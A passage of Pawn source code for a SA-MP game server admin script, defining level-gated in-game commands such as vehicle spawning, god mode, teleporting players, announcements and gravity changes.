{
new Float:x,Float:y,Float:z;
new currentveh;
currentveh = GetPlayerVehicleID(playerid);
new Float:vehx, Float:vehy, Float:vehz;
if(IsPlayerInAnyVehicle(playerid)) return GetVehiclePos(currentveh, vehx, vehy, vehz);
{
GetPlayerPos(playerid,x,y,z);
SetPVarFloat(playerid,"xpos",x); // save X POS
SetPVarFloat(playerid,"ypos",y); // save Y POS
SetPVarFloat(playerid,"zpos",z); // save Z POS
SetPVarInt(playerid,"int",GetPlayerInterior(playerid));//get interior
SendClientMessage(playerid,0x33AA33AA,"Position Saved! Use /l To Get back To It!,");
}
}
return 1;
}
CMD:loadpos(playerid, params[])
{
new currentveh;
currentveh = GetPlayerVehicleID(playerid);
new Float:vehx, Float:vehy, Float:vehz;
if(IsPlayerInAnyVehicle(playerid)) return GetVehiclePos(currentveh, vehx, vehy, vehz);
{
SetPlayerPos(playerid, GetPVarFloat(playerid,"xpos"), GetPVarFloat(playerid,"ypos"), GetPVarFloat(playerid,"zpos"));
CreateVehicle(currentveh, GetPVarFloat(playerid,"xpos"), GetPVarFloat(playerid, "ypos"), GetPVarFloat(playerid,"zpos"),82.2873, 0, 1, 60);
SetPlayerInterior(playerid, GetPVarInt(playerid,"int"));
SendClientMessage(playerid, 0x33AA33AA, "Loaded Saved Position.");
}
return 1;
}
CMD:car(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
	    if(isnull(tmp)) return SendClientMessage(playerid, red, "USAGE: /car [Modelid/Name] [colour1] [colour2]");
		new car, colour1, colour2, string[128];
   		if(!IsNumeric(tmp)) car = GetVehicleModelIDFromName(tmp); else car = strval(tmp);
		if(car < 400 || car > 611) return  SendClientMessage(playerid, red, "ERROR: Invalid Vehicle Model");
		if(isnull(tmp2)) colour1 = random(126); else colour1 = strval(tmp2);
		if(!strlen(tmp3)) colour2 = random(126); else colour2 = strval(tmp3);
		if(PlayerInfo[playerid][pCar] != -1 && !IsPlayerAdmin(playerid) ) CarDeleter(PlayerInfo[playerid][pCar]);
		new LVehicleID,Float:X,Float:Y,Float:Z, Float:Angle,int1;	GetPlayerPos(playerid, X,Y,Z);	GetPlayerFacingAngle(playerid,Angle);   int1 = GetPlayerInterior(playerid);
		LVehicleID = CreateVehicle(car, X+3,Y,Z, Angle, colour1, colour2, -1); LinkVehicleToInterior(LVehicleID,int1); PutPlayerInVehicle(playerid, LVehicleID, 0);
		PlayerInfo[playerid][pCar] = LVehicleID;
		CMDMessageToAdmins(playerid,"CAR");
		format(string, sizeof(string), "%s spawned a \"%s\" (Model:%d) colour (%d, %d), at %0.2f, %0.2f, %0.2f", pName(playerid), VehicleNames[car-400], car, colour1, colour2, X, Y, Z);
        SaveToFile("CarSpawns",string);
		format(string, sizeof(string), "You have spawned a \"%s\" (Model:%d) colour (%d, %d)", VehicleNames[car-400], car, colour1, colour2);
		return SendClientMessage(playerid,lightblue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 3 to use this command");
}

CMD:carhealth(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /carhealth [playerid] [amount]");
		new player1 = strval(tmp), health = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
            if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"CARHEALTH");
				format(string, sizeof(string), "You have set \"%s's\" vehicle health to '%d", pName(player1), health); SendClientMessage(playerid,blue,string);
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your vehicle's health to '%d'", pName(playerid), health); SendClientMessage(player1,blue,string); }
   				return SetVehicleHealth(GetPlayerVehicleID(player1), health);
			} else return SendClientMessage(playerid,red,"ERROR: Player is not in a vehicle");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:carcolour(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !strlen(tmp3) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /carcolour [playerid] [colour1] [colour2]");
		new player1 = strval(tmp), colour1, colour2, string[128];
		if(isnull(tmp2)) colour1 = random(126); else colour1 = strval(tmp2);
		if(!strlen(tmp3)) colour2 = random(126); else colour2 = strval(tmp3);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
            if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"CARCOLOUR");
				format(string, sizeof(string), "You have changed the colour of \"%s's\" %s to '%d,%d'", pName(player1), VehicleNames[GetVehicleModel(GetPlayerVehicleID(player1))-400], colour1, colour2 ); SendClientMessage(playerid,blue,string);
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has changed the colour of your %s to '%d,%d''", pName(playerid), VehicleNames[GetVehicleModel(GetPlayerVehicleID(player1))-400], colour1, colour2 ); SendClientMessage(player1,blue,string); }
   				return ChangeVehicleColor(GetPlayerVehicleID(player1), colour1, colour2);
			} else return SendClientMessage(playerid,red,"ERROR: Player is not in a vehicle");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:god(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
    	if(PlayerInfo[playerid][God] == 0)	{
   	    	PlayerInfo[playerid][God] = 1;
    	    SetPlayerHealth(playerid,100000);
			GivePlayerWeapon(playerid,16,50000); GivePlayerWeapon(playerid,26,50000);
           	SendClientMessage(playerid,green,"GODMODE ON");
			return CMDMessageToAdmins(playerid,"GOD");
		} else {
   	        PlayerInfo[playerid][God] = 0;
       	    SendClientMessage(playerid,red,"GODMODE OFF");
        	SetPlayerHealth(playerid, 100);
		} return GivePlayerWeapon(playerid,35,0);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}

CMD:sgod(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
   		if(PlayerInfo[playerid][God] == 0)	{
        	PlayerInfo[playerid][God] = 1;
	        SetPlayerHealth(playerid,100000);
			GivePlayerWeapon(playerid,16,50000); GivePlayerWeapon(playerid,26,50000);
            return SendClientMessage(playerid,green,"GODMODE ON");
		} else	{
   	        PlayerInfo[playerid][God] = 0;
            SendClientMessage(playerid,red,"GODMODE OFF");
	        SetPlayerHealth(playerid, 100); return GivePlayerWeapon(playerid,35,0);	}
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 5 to use this command");
}

CMD:godcar(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(IsPlayerInAnyVehicle(playerid)) {
	    	if(PlayerInfo[playerid][GodCar] == 0) {
        		PlayerInfo[playerid][GodCar] = 1;
   				CMDMessageToAdmins(playerid,"GODCAR");
                  SetVehicleHealth(VID[playerid], 9999999999.0);
                  RepairVehicle(VID[playerid]);
            	return SendClientMessage(playerid,green,"GODCARMODE ON");
			} else {
	            PlayerInfo[playerid][GodCar] = 0;
    	        return SendClientMessage(playerid,red,"GODCARMODE OFF"); }
		} else return SendClientMessage(playerid,red,"ERROR: You need to be in a car to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:die(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
		new Float:x, Float:y, Float:z ;
		GetPlayerPos( playerid, Float:x, Float:y, Float:z );
		CreateExplosion(Float:x+10, Float:y, Float:z, 8,10.0);
		CreateExplosion(Float:x-10, Float:y, Float:z, 8,10.0);
		CreateExplosion(Float:x, Float:y+10, Float:z, 8,10.0);
		CreateExplosion(Float:x, Float:y-10, Float:z, 8,10.0);
		CreateExplosion(Float:x+10, Float:y+10, Float:z, 8,10.0);
		CreateExplosion(Float:x-10, Float:y+10, Float:z, 8,10.0);
		return CreateExplosion(Float:x-10, Float:y-10, Float:z, 8,10.0);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:getid(playerid,params[]) {
	if(isnull(params)) return SendClientMessage(playerid,blue,"Correct USAGE: /getid [part of nick]");
	new found, string[128], playername[MAX_PLAYER_NAME];
	format(string,sizeof(string),"Searched for: \"%s\" ",params);
	SendClientMessage(playerid,blue,string);
	for(new i=0; i <= MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
	  		GetPlayerName(i, playername, MAX_PLAYER_NAME);
			new namelen = strlen(playername);
			new bool:searched=false;
	    	for(new pos=0; pos <= namelen; pos++)
			{
				if(searched != true)
				{
					if(strfind(playername,params,true) == pos)
					{
		                found++;
						format(string,sizeof(string),"%d. %s (ID %d)",found,playername,i);
						SendClientMessage(playerid, green ,string);
						searched = true;
					}
				}
			}
		}
	}
	if(found == 0) SendClientMessage(playerid, lightblue, "No players have this in their nick");
	return 1;
}

CMD:asay(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /asay [text]");
		new string[128]; format(string, sizeof(string), "***Admin %s: %s", PlayerName2(playerid), params[0] );
		return SendClientMessageToAll(COLOR_PINK,string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}

CMD:hsay(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Helper] == 1) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /hsay [text]");
		new string[128]; format(string, sizeof(string), "<!> Moderator %s: %s", PlayerName2(playerid), params[0] );
		return SendClientMessageToAll(COLOR_PINK,string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be Help moderator to use this command");
}

CMD:highlight(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /highlight [playerid]");
	    new player1, playername[MAX_PLAYER_NAME], string[128];
	    player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		 	GetPlayerName(player1, playername, sizeof(playername));
	 	    if(PlayerInfo[player1][blip] == 0) {
				CMDMessageToAdmins(playerid,"HIGHLIGHT");
				PlayerInfo[player1][pColour] = GetPlayerColor(player1);
				PlayerInfo[player1][blip] = 1;
				BlipTimer[player1] = SetTimerEx("HighLight", 1000, 1, "i", player1);
				format(string,sizeof(string),"You have highlighted %s's marker", playername);
			} else {
				KillTimer( BlipTimer[player1] );
				PlayerInfo[player1][blip] = 0;
				SetPlayerColor(player1, PlayerInfo[player1][pColour] );
				format(string,sizeof(string),"You have stopped highlighting %s's marker", playername);
			}
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setgravity(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)||!(strval(params)<=50&&strval(params)>=-50)) return SendClientMessage(playerid,red,"USAGE: /setgravity <-50.0 - 50.0>");
        CMDMessageToAdmins(playerid,"SETGRAVITY");
		new string[128],adminname[MAX_PLAYER_NAME]; GetPlayerName(playerid, adminname, sizeof(adminname)); new Float:Gravity = floatstr(params);format(string,sizeof(string),"Admnistrator %s has set the gravity to %f",adminname,Gravity);
		SetGravity(Gravity); return SendClientMessageToAll(blue,string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:serverinfo(playerid,params[]) {
	#pragma unused params
    new TotalVehicles = CreateVehicle(411, 0, 0, 0, 0, 0, 0, 1000);    DestroyVehicle(TotalVehicles);
	new numo = CreateDynamicObject(1245,0,0,1000,0,0,0);	DestroyObject(numo);
	new nump = CreatePickup(371,2,0,0,1000);	DestroyPickup(nump);
	new gz = GangZoneCreate(3,3,5,5);	GangZoneDestroy(gz);

	new model[250], nummodel;
	for(new i=1;i<TotalVehicles;i++) model[GetVehicleModel(i)-400]++;
	for(new i=0;i<250;i++)	if(model[i]!=0)	nummodel++;

	new string[256];
	format(string,sizeof(string),"Server Info: [ Players Connected: %d || Maximum Players: %d ] [Ratio %0.2f ]",ConnectedPlayers(),GetMaxPlayers(),Float:ConnectedPlayers() / Float:GetMaxPlayers() );
	SendClientMessage(playerid,green,string);
	format(string,sizeof(string),"Server Info: [ Vehicles: %d || Models %d || Players In Vehicle: %d || InCar %d / OnBike %d ]",TotalVehicles-1,nummodel, InVehCount(),InCarCount(),OnBikeCount() );
	SendClientMessage(playerid,green,string);
	format(string,sizeof(string),"Server Info: [ Objects: %d || Pickups %d || Gangzones %d ]",numo-1, nump, gz);
	SendClientMessage(playerid,green,string);
	format(string,sizeof(string),"Server Info: [ Players In Jail %d || Players Frozen %d || Muted %d ]",JailedPlayers(),FrozenPlayers(), MutedPlayers() );
	return SendClientMessage(playerid,green,string);
}

CMD:announce(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
    	if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /announce <text>");
    	CMDMessageToAdmins(playerid,"ANNOUNCE");
		return GameTextForAll(params,4000,3);
    } else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:announce2(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
        new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index) ,tmp3 = strtok(params,Index);
	    if(isnull(tmp)||isnull(tmp2)||!strlen(tmp3)) return SendClientMessage(playerid,red,"USAGE: /announce <style> <time> <text>");
		if(!(strval(tmp) >= 0 && strval(tmp) <= 6) || strval(tmp) == 2)	return SendClientMessage(playerid,red,"ERROR: Invalid gametext style. Range: 0 - 6");
		CMDMessageToAdmins(playerid,"ANNOUNCE2");
		return GameTextForAll(params[(strlen(tmp)+strlen(tmp2)+2)], strval(tmp2), strval(tmp));
    } else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}

CMD:ann(playerid,params[]) {
	return cmd_announce(playerid, params);
}

CMD:ann2(playerid,params[]) {
	return cmd_announce2(playerid, params);
}
CMD:lslowmo(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		new Float:x, Float:y, Float:z; GetPlayerPos(playerid, x, y, z); CreatePickup(1241, 4, x, y, z);
		return CMDMessageToAdmins(playerid,"LSLOWMO");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:jetpack(playerid,params[]) {
    if(isnull(params))	{
    	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
			SendClientMessage(playerid,blue,"Jetpack Spawned.");
			CMDMessageToAdmins(playerid,"JETPACK");
			return SetPlayerSpecialAction(playerid, 2);
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else {
	    new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
    	player1 = strval(params);
		if(PlayerInfo[playerid][Level] >= 4)	{
		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid)	{
				CMDMessageToAdmins(playerid,"JETPACK");		SetPlayerSpecialAction(player1, 2);
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				format(string,sizeof(string),"Administrator \"%s\" has given you a jetpack",adminname); SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"You have given %s a jetpack", playername);
				return SendClientMessage(playerid,blue,string);
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	}
}

CMD:flip(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) {
		    if(IsPlayerInAnyVehicle(playerid)) {
			new VehicleID, Float:X, Float:Y, Float:Z, Float:Angle; GetPlayerPos(playerid, X, Y, Z); VehicleID = GetPlayerVehicleID(playerid);
			GetVehicleZAngle(VehicleID, Angle);	SetVehiclePos(VehicleID, X, Y, Z); SetVehicleZAngle(VehicleID, Angle); SetVehicleHealth(VehicleID,1000.0);
			CMDMessageToAdmins(playerid,"FLIP"); return SendClientMessage(playerid, blue,"Vehicle Flipped. You can also do /flip [playerid]");
			} else return SendClientMessage(playerid,red,"Error: You are not in a vehicle. You can also do /flip [playerid]");
		}
	    new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
	    player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"FLIP");
			if (IsPlayerInAnyVehicle(player1)) {
				new VehicleID, Float:X, Float:Y, Float:Z, Float:Angle; GetPlayerPos(player1, X, Y, Z); VehicleID = GetPlayerVehicleID(player1);
				GetVehicleZAngle(VehicleID, Angle);	SetVehiclePos(VehicleID, X, Y, Z); SetVehicleZAngle(VehicleID, Angle); SetVehicleHealth(VehicleID,1000.0);
				CMDMessageToAdmins(playerid,"FLIP");
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				format(string,sizeof(string),"Administrator %s flipped your vehicle",adminname); SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"You have flipped %s's vehicle", playername);
				return SendClientMessage(playerid, blue,string);
			} else return SendClientMessage(playerid,red,"Error: This player isn't in a vehicle");
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:destroycar(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) return EraseVehicle(GetPlayerVehicleID(playerid));
	else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:ltc(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		if(!IsPlayerInAnyVehicle(playerid)) {
			if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
			new Float:X,Float:Y,Float:Z,Float:Angle,LVehicleIDt;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
	        LVehicleIDt = CreateVehicle(560,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");	    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);
			AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
		    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
		    AddVehicleComponent(LVehicleIDt, 1080);	AddVehicleComponent(LVehicleIDt, 1086); AddVehicleComponent(LVehicleIDt, 1087); AddVehicleComponent(LVehicleIDt, 1010);	PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	ChangeVehiclePaintjob(LVehicleIDt,0);
	   	   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
			return PlayerInfo[playerid][pCar] = LVehicleIDt;
		} else return SendClientMessage(playerid,red,"Error: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}


CMD:teleplayer(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /teleplayer [playerid] to [playerid]");
		new player1 = strval(tmp), player2 = strval(tmp2), string[128], Float:plocx,Float:plocy,Float:plocz;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
 		 	if(IsPlayerConnected(player2) && player2 != INVALID_PLAYER_ID) {
	 		 	CMDMessageToAdmins(playerid,"TELEPLAYER");
				GetPlayerPos(player2, plocx, plocy, plocz);
				new intid = GetPlayerInterior(player2);	SetPlayerInterior(player1,intid);
				SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(player2));
				if (GetPlayerState(player1) == PLAYER_STATE_DRIVER)
				{
					new VehicleID = GetPlayerVehicleID(player1);
					SetVehiclePos(VehicleID, plocx, plocy+4, plocz); LinkVehicleToInterior(VehicleID,intid);
					SetVehicleVirtualWorld(VehicleID, GetPlayerVirtualWorld(player2) );
				}
				else SetPlayerPos(player1,plocx,plocy+2, plocz);
				format(string,sizeof(string),"Administrator \"%s\" has teleported \"%s\" to \"%s's\" location", pName(playerid), pName(player1), pName(player2) );
				SendClientMessage(player1,blue,string); SendClientMessage(player2,blue,string);
				format(string,sizeof(string),"You have teleported \"%s\" to \"%s's\" location", pName(player1), pName(player2) );
 		 	    return SendClientMessage(playerid,blue,string);
 		 	} else return SendClientMessage(playerid, red, "Player2 is not connected");
		} else return SendClientMessage(playerid, red, "Player1 is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:goto(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /goto [playerid]");
	    new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GOTO");
			new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z); SetPlayerInterior(playerid,GetPlayerInterior(player1));
			SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(player1));
			if(GetPlayerState(playerid) == 2) {
				SetVehiclePos(GetPlayerVehicleID(playerid),x+3,y,z);	LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(player1));
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(player1));
			} else SetPlayerPos(playerid,x+2,y,z);
			format(string,sizeof(string),"You have teleported to \"%s\"", pName(player1));
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:vgoto(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /vgoto [vehicleid]");
	    new player1, string[128];
	    player1 = strval(params);
		CMDMessageToAdmins(playerid,"VGOTO");
		new Float:x, Float:y, Float:z;	GetVehiclePos(player1,x,y,z);
		SetPlayerVirtualWorld(playerid,GetVehicleVirtualWorld(player1));
		if(GetPlayerState(playerid) == 2) {
			SetVehiclePos(GetPlayerVehicleID(playerid),x+3,y,z);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), GetVehicleVirtualWorld(player1) );
		} else SetPlayerPos(playerid,x+2,y,z);
		format(string,sizeof(string),"You have teleported to vehicle id %d", player1);
		return SendClientMessage(playerid,blue,string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:vget(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /vget [vehicleid]");
	    new player1, string[128];
	    player1 = strval(params);
		CMDMessageToAdmins(playerid,"VGET");
		new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z);
		SetVehiclePos(player1,x+3,y,z);
		SetVehicleVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
		format(string,sizeof(string),"You have brough vehicle id %d to your location", player1);
		return SendClientMessage(playerid,blue,string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:lgoto(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
		new Float:x, Float:y, Float:z;
        new tmp[256], tmp2[256], tmp3[256];
		new string[128], Index;	tmp = strtok(params,Index); tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
    	if(isnull(tmp) || isnull(tmp2) || !strlen(tmp3)) return SendClientMessage(playerid,red,"USAGE: /lgoto [x] [y] [z]");
	    x = strval(tmp);		y = strval(tmp2);		z = strval(tmp3);
		CMDMessageToAdmins(playerid,"LGOTO");
		if(GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid),x,y,z);
		else SetPlayerPos(playerid,x,y,z);
		format(string,sizeof(string),"You have teleported to %f, %f, %f", x,y,z); return SendClientMessage(playerid,blue,string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}


CMD:get(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2|| IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /get [playerid]");
    	new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GET");
			new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z); SetPlayerInterior(player1,GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
			if(GetPlayerState(player1) == 2)	{
			    new VehicleID = GetPlayerVehicleID(player1);
				SetVehiclePos(VehicleID,x+3,y,z);   LinkVehicleToInterior(VehicleID,GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(GetPlayerVehicleID(player1),GetPlayerVirtualWorld(playerid));
			} else SetPlayerPos(player1,x+2,y,z);
			format(string,sizeof(string),"You have been teleported to Administrator \"%s's\" location", pName(playerid) );	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have teleported \"%s\" to your location", pName(player1) );
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:eget(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2|| IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /get [playerid]");
    	new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GET");
			new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z); SetPlayerInterior(player1,GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
			if(GetPlayerState(player1) == 2)	{
			    new VehicleID = GetPlayerVehicleID(player1);
				SetVehiclePos(VehicleID,x+3,y,z);   LinkVehicleToInterior(VehicleID,GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(GetPlayerVehicleID(player1),GetPlayerVirtualWorld(playerid));
			} else SetPlayerPos(player1,x+2,y,z);
			format(string,sizeof(string),"You have been teleported to Administrator \"%s's\" location", pName(playerid) );	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have teleported \"%s\" to your location", pName(player1) );
			TogglePlayerControllable(player1, false);
			PlayerInfo[player1][Frozen] = 1;
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
